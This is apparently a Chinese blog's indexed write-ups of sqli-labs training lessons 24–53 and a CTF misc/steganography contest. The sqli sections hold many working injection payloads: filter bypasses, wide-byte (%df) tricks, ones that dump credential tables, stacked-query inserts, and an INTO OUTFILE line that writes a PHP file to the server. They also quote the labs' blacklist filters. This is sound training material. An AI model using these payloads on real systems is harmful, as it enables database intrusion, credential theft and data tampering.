PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义了 在修改用户名这里，从 session 中直接获得了用户名，并且直接用于更新语句并未做检查，从根本上来说，插入数据时没有做过滤，只是做了转义处理 也就是说当前用户中如果含有注释，便可以更改当前用户名中包含的另一用户的密码，例如注册用户Dumb’– + 那么他就可以更改 Dumb 的密码 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less---24-second-degree-injections-real-treat--store-injections"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-25 Trick with OR \u0026 AND过滤了or和and waf function blacklist($id) { $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive) return $id; } 过滤的方式是替换为空 bypass 双写绕过 oorr 大小写变形绕过 or=Or=oR=OR 利用运算符 or=|| and=\u0026\u0026 url编码绕过 #=%23,hex编码 ~=0x7e 添加注释 /*or*/ ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-25-trick-with-or--and"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-25a Trick with OR \u0026 AND Blind过滤了or和and的盲注 可以用脚本 Bool 或 Time 盲注 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-25a-trick-with-or--and-blind"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-26 Trick with comments and space过滤了注释和空格的注入 waf function blacklist($id) { $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out -- $id= preg_replace('/[#]/',\"\", $id); //Strip out # $id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes return $id; } 不仅过滤了or 与 and, 还过滤了单行注释–与#,以及多行注释 /**/,还过滤了空格，以及正反斜杠 / 注释符号bypass： 构造'来闭合后面的' 空格bypass： %09 TAB水平 %0a 新建一行 %0c 新建一页 %0d return功能 %0b TAB(垂直) %a0 空格 payload #报错注入 爆数据库: '||updatexml(1,concat('$',(database())),0)||'1'='1 爆表: '||updatexml(1,concat('$',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),0)||'1'='1 爆字段: '||updatexml(1,concat('$',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security')%26%26(table_name='users'))),0)||'1'='1 爆数据: '||updatexml(1,concat('$',(select(concat('$',id,'$',username,'$',passwoorrd))from(users)limit%0b0,1)),0)||'1'='1 #布尔盲注 1'%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))\u003e65)||'1'=' ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-26-trick-with-comments-and-space"},{"categories":["web","wp","sqli-labs"],"content":"\rless 26a GET - Blind Based - All your SPACES and COMMENTS belong to us过滤了空格和注释的盲注 关闭了详细的报错，可进行盲注，闭合使用') payload类似上题 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-26a-get---blind-based---all-your-spaces-and-comments-belong-to-us"},{"categories":["web","wp","sqli-labs"],"content":"\rless 27 GET - Error Based- All your UNION \u0026 SELECT belong to us过滤了union和select的 function blacklist($id) { $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out --. $id= preg_replace('/[#]/',\"\", $id); //Strip out #. $id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. $id= preg_replace('/select/m',\"\", $id); //Strip out spaces. $id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. $id= preg_replace('/union/s',\"\", $id); //Strip out union $id= preg_replace('/select/s',\"\", $id); //Strip out select $id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION $id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT $id= preg_replace('/Union/s',\"\", $id); //Strip out Union $id= preg_replace('/Select/s',\"\", $id); //Strip out select return $id; } bypass 大小写绕过 seleCt UniOn 空格 /*%0a*/ 或者 %0a payload 爆库: 0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/'1'='1 爆表: 0'%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'),3||'1 爆字段: 0'%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema='security'%0bAnd%0btable_name='users'%0b%26%26%0b'1'='1 爆数据: 0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws('$',id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/'1'='1 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-27-get---error-based--all-your-union--select-belong-to-us"},{"categories":["web","wp","sqli-labs"],"content":"\rless 27a GET - Blind Based- All your UNION \u0026 SELECT belong to us盲注，过滤了union和select 双引号进行闭合，bypass方式同上 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:8","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-27a-get---blind-based--all-your-union--select-belong-to-us"},{"categories":["web","wp","sqli-labs"],"content":"\rless 28 GET - Error Based- All your UNION \u0026 SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入 function blacklist($id) { # 过滤 /* $id= preg_replace('/[\\/\\*]/',\"\", $id); # 过滤 - # 注释 $id= preg_replace('/[--]/',\"\", $id); $id= preg_replace('/[#]/',\"\", $id); # 过滤 空格 + $id= preg_replace('/[ +]/',\"\", $id);. # 过滤 union select /i 大小写都过滤 $id= preg_replace('/union\\s+select/i',\"\", $id); return $id; } 过滤了相连的 union 加 空格 加 select，同时匹配大小写 bypass #双写绕过 ?id=0')uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and ('1 #或者 ?id=0')%0buniOn%0bsElEct%0b1,database(),3%0bor%0b('1')=('1 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:9","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-28-get---error-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis"},{"categories":["web","wp","sqli-labs"],"content":"\rless 28a GET - Bind Based- All your UNION \u0026 SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入 只过滤了union select 绕过方式同上题 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:10","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-28a-get---bind-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-29 GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.基于WAF的一个错误 服务器架构 client 访问服务器，能直接访问到 Tomcat 服务器，然后 tomcat 服务器在向 Apache 服务器请求数据，数据返回路径刚好相反 HTTP参数污染 不同的中间件在处理参数重复问题解析到的参数不同 e.g. index.php?id=1\u0026id=2 apache(php)解析最后一个参数,即回显id=2 而tomcat(jsp)解析第一个参数,即回显id=1 在本题目当中，waf在tomcat，对第一个参数进行了过滤，二apache解析的是第二个参数 payload #爆表 ?id=1\u0026id=-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+ #爆字段 ?id=1\u0026id=-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name='users'--+ #爆密码账户 ?id=1\u0026id=-2%27%20union%20select%201,group_concat(password,username),3%20from%20users--+ ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:11","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-29-get--error-based--impidence-mismatch--having-a-waf-in-front-of-web-application"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-30 Get-Blind Havaing with WAF同上题，闭合方式变为双引号 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:12","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-30-get-blind-havaing-with-waf"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-31 Protection with WAFbypass同上，闭合方式变为\") ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:13","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-31-protection-with-waf"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录32-37 ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-32 Bypass addslashes() function check_addslashes($string) { $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string); //escape double quote with a backslash return $string; } 使用preg_replace函数将 斜杠，单引号和双引号过滤 宽字节注入原理 MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。 使用%df去除/ urlencode(\\') = %5c%27，我们在 %5c%27 前面添加 %df，形 成 %df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 %df%5c 当做是一个汉字運，%27 则作为一个单独的符号在外面，此时'就逃逸出来了。 bypass 使用%df宽字节注入来消除反斜杠 payload 爆库: -1%df%27 union select 1,2,database()--+ 爆表： -1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 或者将security转换为16进制: -1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+ 爆字段: user转换为16进制：0x7573657273 -1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+ 爆数据: -1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users--+ 或者 -1%df%27 union select 1,group_concat(username,0x7e,password),3 from users--+ ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-32-bypass-addslashes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-33 Bypass addslashes()bypass和payload同上题 ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-33-bypass-addslashes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-34 Bypass Add SLASHES基于错误 POST 单引号字符型 addslashes () 宽字节注入 bypass和payload同上题 ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-34-bypass-add-slashes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-35 why care for addslashes()基于错误 GET 数字型 addslashes () 宽字节注入 数字型，注入语句出现的引号里面的数据需要转换为十六进制 payload 爆库: -1 union select 1,2,database()--+ 爆表: -1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+ 爆字段: -1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+ 爆数据: ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-35-why-care-for-addslashes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-36 Bypass MySQL Real Escape String function check_quotes($string) { $string= mysql_real_escape_string($string); return $string; } mysql_real_escape_string()函数转义的特殊字符 \\x00 \\n \\r \\ ' \" \\x1a GBK编码，宽字节注入 payload 爆位置: 0%bb%5c%5c%27 union select 1,2,3-- # 爆数据库: -1%E6' union select 1,2,database()--+ 爆表: -1%E6' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+ 爆列名: -1%E6' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+ 爆值: -1%E6' union select 1,group_concat(username,0x7e,password),3 from security.users --+ ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-36-bypass-mysql-real-escape-string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-37- MySQL_real_escape_stringpost请求，payload同上题 ","date":"2023-11-17","objectID":"/sqli-labs_5_wchar/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(5)宽字节注入","uri":"/sqli-labs_5_wchar/#less-37--mysql_real_escape_string"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录38-45 ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-38 GET- Stacked Query Injection - String基于错误 GET 单引号字符型堆叠注入 vul if (mysqli_multi_query($con1, $sql)) { ... 因为存在mysqli_multi_query函数，该函数支持多条sql语句同时进行。 使用分号，来执行两条命令 插入新数据 1';insert into users(id,username,password) values(38,'test','1')--+ ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-38-get--stacked-query-injection---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-39 GET - Stacked Query Injection - Intiger基于错误 GET 数字型堆叠注入 ?id=1;insert into users(id,username,password) values(39,'less39','test')--+ ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-39-get----stacked-query-injection---intiger"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-40 GET - BLIND based - String - Stacked基于布尔 GET 单引号小括号字符型盲注堆叠注入 bypass ?id=1');insert into users values(40,'Less40','hello')--+ 关闭了报错，但是可以根据页面是否有内容来判断，语句是否正确 ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-40--get---blind-based---string---stacked"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-41 GET - BLIND based - Intiger - Stacked基于布尔 GET 数字型盲注堆叠注入 bypass ?id=1;insert into users values(41,'Less41','hello')--+ ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-41-get---blind-based---intiger---stacked"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-42 - POST - Error based - String - Stacked基于存储 POST 单引号字符型堆叠注入 $username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]); $password = $_POST[\"login_password\"]; post发包 login_user=1\u0026login_password=1';insert into users(id,username,password) values ('39','less30','123456')--+\u0026mysubmit=Login ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-42---post---error-based---string---stacked"},{"categories":["web","wp","sqli-labs"],"content":"\rless43 POST -Error based -String -Stacked with tiwstPOST型基于错误的堆叠变形字符型注入 bypass 1');insert into users values(43,'Less43','Less43')# ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less43-post--error-based--string--stacked-with-tiwst"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-44 - POST - Error based - String - Stacked -Blind基于存储 POST 单引号字符型盲注堆叠注入 bypass 1';insert into users values ('44','less44','hello')# ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-44---post---error-based---string---stacked--blind"},{"categories":["web","wp","sqli-labs"],"content":"\rless-45 POST - Error based - String - Stacked - Blind基于存储 POST 单引号小括号字符型盲注堆叠注入 bypass 1');insert into users(id,username,password) values(45,'Less45','Less45')# ","date":"2023-11-17","objectID":"/sqli-labs_6_stacked/:0:8","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(6)堆叠注入","uri":"/sqli-labs_6_stacked/#less-45-post---error-based---string---stacked---blind"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录46-53 ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#"},{"categories":["web","wp","sqli-labs"],"content":"\rless-46 GET - Error based - Numeric - ORDER BY CLAUS基于错误 GET 数字型排序注入 $id=$_GET['sort']; ... $sql = \"SELECT * FROM users ORDER BY $id\"; $result = mysql_query($sql); 使用新的参数sort，通过输入1，2，3表中出现不同数据 报错注入 ?sort=(extractvalue(1,concat(0x7e,(select user()),0x7e)))# 延时注入 ?sort= 1 and sleep(5) 写文件 ?sort=1 into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs\\\\Less-46\\\\shell.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+ #十六进制的 \u003c?php phphinfo();?\u003e ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-46-get---error-based---numeric---order-by-claus"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-47 GET - Error based - String - ORDER BY CLAUS基于错误 GET 字符型单引号排序注入 bypass 1' and (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+ tips Less-46中，我们没有用注释符注释尾部是因为他是数字型，且注入的位置在 SQL 语句尾部，而字符型就必须注释，否则无法进行单引号的正常闭合 ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-47-get---error-based---string---order-by-claus"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-48 GET - Error based - Blind- Numeric- ORDER BY CLAUS基于盲注 GET 数字型排序注入 同46，关闭了报错，无法使用报错注入，进行盲注 ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-48-get---error-based---blind--numeric--order-by-claus"},{"categories":["web","wp","sqli-labs"],"content":"\rLess49 GET - Error based - String- Blind - ORDER BY CLAUS基于盲注 GET 字符型单引号排序注入 同47，关闭了报错，无法使用报错注入 时间盲注 1' and if(ascii(mid(database(),1,1))=115,1,sleep(1))--+ ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less49-get---error-based---string--blind---order-by-claus"},{"categories":["web","wp","sqli-labs"],"content":"\rLess - 50 GET - Error based - ORDER BY CLAUSE -numeric- Stacked injection基于错误 GET 数字型排序堆叠注入 同46，可以使用updatexml进行报错注入。因为使用了mysqli_multi_query函数，还可以使用堆叠注入，也可以延时注入。 排序注入 (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) 1 and (updatexml(1,concat(0x7e,(select database())),0)) 堆叠注入 1;insert into users(id,username,password) values(50,'Less50','123456')--+ ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less---50-get---error-based---order-by-clause--numeric--stacked-injection"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-51 GET - Error based - ORDER BY CLAUSE-Stri ng基于错误 GET 字符型单引号排序堆叠注入 同50，单引号闭合，注释 payload 1' and (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+ 1';insert into users values(51,'Less51','Less51')--+ ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-51-get---error-based---order-by-clause-stri-ng"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-52 GET - Blind based - ORDER BY CLAUSE -numeric- Stacked injection基于布尔的GET 数字型盲注堆叠注入 同50，但数字型，可布尔盲注，延时注入，堆叠注入 堆叠注入 1;insert into users(id,username,password) values(52,'Less52','123456')--+ ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-52-get---blind-based---order-by-clause--numeric--stacked-injection"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-53 GET - Blind based - ORDER BY CLAUS string- Stacked injection基于布尔的GET单引号字符型盲注堆叠注入 同51，字符型，单引号闭合，无报错显示，可堆叠注入和延时注入。 ","date":"2023-11-17","objectID":"/sqli-labs_7_order/:0:8","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(7)排序注入","uri":"/sqli-labs_7_order/#less-53-get---blind-based---order-by-claus-string--stacked-injection"},{"categories":["wp"],"content":"2022.11 SkyNICO CTF三校联赛wp ","date":"2023-11-17","objectID":"/skynico2022.11/:0:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#"},{"categories":["wp"],"content":"\r【Misc福利题】sign sign sign签到题不必多说了，扫描二维码复制字符串，放进[随波逐流]一键base 但一定要注意，要把字符串复制全，别漏了末尾的等号(可能三个) ","date":"2023-11-17","objectID":"/skynico2022.11/:1:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#misc福利题sign-sign-sign"},{"categories":["wp"],"content":"\r[Misc]幸亏开着wiresharktips:Wanna有个HID键盘和Cisco交换机 下载附件之后，解压发现有个txt后缀的文件和png文件，都显然不是既定后缀文件，放进010edits，查看文件头和ASCII转码显示的字符，发现那个那个所谓的txt文件是一个7z压缩包，而那个png文件 其实题目名称已经有暗示了，直接拖进wireshark 同时我也对该题进行了百度，数据协议:USB，是抓取的键盘流量，下载相关脚本，但怎么也跑不出来，经过了许久地反复横跳，我发现了问题所在，本次题目文件中有些许冗杂的数据，阻碍了脚本的运行 删掉他们重新导出pcapng数据，只保留一下信息 重新跑脚本，得到了压缩包密码：where is you 解压后得到了一个文本文件，系Cisco交换机配置文件 好骚的题，复制那堆emoji表情进行解码，得到hint，解码password7可得flag 随后去搜索，Cisco交换机加密方式， 看到了7！一眼丁真，在线网站直接解密 ","date":"2023-11-17","objectID":"/skynico2022.11/:2:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#misc幸亏开着wireshark"},{"categories":["wp"],"content":"\r【Misc福利题】啊吧啊吧也算是签到题吧，发送到foremost进行分解，然后OCR提取flag，同时遇到了一个问题，flag死活不对，原因系相似字符混淆注意。一定要注意形似字符区分(好丢nian) lI| lI| 不同字体会有不一样的显示 ","date":"2023-11-17","objectID":"/skynico2022.11/:3:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#misc福利题啊吧啊吧"},{"categories":["wp"],"content":"\r[Misc]Pixels In Picture放大仔细看，有隐写的像素点，就叫他像素点隐写吧，也没啥太好的办法，拉进ps或者lr， 我的办法是，能直接读的就读，看不清就拉参数，结合lr和Stegsolve多生成几张对比着看 愣看，不知道师傅们有什么更好的方法。 ","date":"2023-11-17","objectID":"/skynico2022.11/:4:0","series":null,"tags":["wp"],"title":"2022 SkyNICO三校联赛","uri":"/skynico2022.11/#miscpixels-in-picture"},{"categories":["wp"],"content":"\r[Misc]希尔伯特的微笑当你跳跃维度，希尔伯特在向你微笑，从alpha的角度看去，在希尔伯特曲线中领悟真谛，上下颠倒，在Quine中，发现隐藏在空白之下的秘密 真不好意思，这个题被我做成社工题了， 摘自：https://www.anquanke.com/post/id/244533 题目描述：“三体人要入侵地球了，听说他们要使出最厉害的武器” 打开图片，发现有三个重复的图形，下面有”DIFOIL”字样，再下面好像还有一串字，但看不清楚。 图片看起来很奇怪，三个图形也呼应了“ThreeBody”的题目名称。 对于图片题目常规操作，使用StegSolve查看各图层，能发现两张隐藏的图片，其他图层再没有什么可疑的东西了： 图片上能认出半个星球、一个宇航员、一只手，以及《三体》中经典的一句话“你们都是虫子”。 对三体比较熟悉的同学可能可以猜出这张图以及原始图片是三体人使用二向箔对地球进行降维打击的场景。 这里也是小小地调侃了一下选手。如果不能找到通往下一步的方法，便只能停留在这里，被三体人嘲讽为“虫子”。 让我们再回到原始图片，放大看其中的细节： 可见图片中红黄蓝绿交错，有老式电视像素点的感觉。 通过010Editor查看像素点数值： 可见相邻像素点的RGB值都差异巨大，正常情况下相邻像素点的RGB值应该差不多才对。 再仔细观察可以发现，如果以4为周期的话相邻像素的数值就差不多了，考虑正常情况下该图片的像素点应该是每4个一组。相当于原始图片是四维的，这里被“降维打击”成了三维。我们这里需要做的，便是对图片进行升维处理。 BMP格式的头部有个字节是控制每个像素点所占的比特数，现在为24，也就是3个字节，我们将这个字段改为4个字节对应的32： biBitCount 保存后重新打开图片，便可以看到正常的图形了： 再次通过StegSolve进行查看，可以发现隐藏图片： 很多人看到“Welcome to QWB”可能就放松了警惕，以为这是一张随便放的没啥用的图片，便去找其他线索了。在CTF题目中忽视作者所给的线索是大忌，其实这里是非常关键的，所以在比赛过程中我有提示“所有图片的内容都是有意义的”。 其实细心的话可以看到左上角有一些小白点，代表着那里隐藏着一些信息。使用StegSolve的Data Extract功能查看该空间： 可以看到有“Who am I?”的字样。 再以列为方式查看： 可以看到有“David”字样。 根据这张照片和“David”的提示，通过一番搜索可得知这一位是知名的数学家大卫·希尔伯特： 不过除此之外我们得不到更多的信息了。Flag在哪呢？ 让我们再用010Editor查看修改后的图片： 可以看到每个像素除了有RGB三个字段外还有一个字段，代表图片还有另一个通道。 rgbReserved 这个字段有些跟是一样的，但也有一些有细微差异。 rgbBlue 信息会不会就隐藏在字段呢？ rgbReserved 字段是有数值的，所以该通道肯定有对应的图形，不过刚才通过StegSolve并没有看到该通道。 rgbReserved 这里一个方法是修改BMP的文件头，使得StegSolve把该通道识别为Alpha通道。 不过这个可能需要了解一些BMP头相关的知识。这里采用一个更为暴力的方法，通过一个Python脚本解析BMP文件结构，把的数值复制给： rgbReserved rgbBlue with open(’threebody.bmp’, ‘rb’) as f: d = f.read()w = 580h = 435b = 4l = bytearray(d)off = l[10]for i in range(h): for j in range(w): l[off+jb+ibw] = l[off+jb+ibw+3]with open(’threebody_new.bmp’, ‘wb’) as f: f.write(l) 再通过StegSolve进行查看，可以发现另一个隐藏的图形： 可见中间是一个黑白相间的正方形，其中左上角部分比其他部分颜色要深一些。 大家肯定能想到这里的黑白便是01序列，所以这是一个二维的二进制数组。考虑将这些二进制数组逐行保存成二进制文件，无果，并且如果是逐行保存的话不应该出现左上角的区域与其他区域密度明显不同的情况。 那这个二维数组里的信息是如何储存的呢？ 这又要回到刚才提到的数学家希尔伯特了。希尔伯特提出过一种希尔伯特曲线，是一个高维到低维的映射。我们现在得到的二维二进制数组，可以通过这种方式进行降维处理转化成一串一维的二进制流。 并且，希尔伯特曲线的一个特性便是如果从低维还原成高维，则低维中相邻的点在高维中也是相邻的。这就解释了为什么会出现某一块区域密度与其他区域密度不同的情况。 不过从希尔伯特想到希尔伯特曲线可能并不十分容易，希尔伯特作为一位伟大的数学家一生的成就太多了，希尔伯特曲线可能只是其中不起眼的一个成就。 